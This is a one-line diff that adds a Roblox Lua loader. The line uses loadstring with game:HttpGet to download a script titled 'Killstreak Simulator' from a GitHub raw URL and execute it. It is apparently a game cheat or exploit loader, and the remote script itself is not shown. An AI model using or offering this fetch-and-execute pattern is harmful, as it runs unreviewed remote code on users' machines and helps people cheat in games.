@@ -1,0 +1,1 @@
+loadstring(game:HttpGet('https://raw.githubusercontent.com/multistorr383/Joe-s-Ribs/main/Killstreak%20Simulator'))()
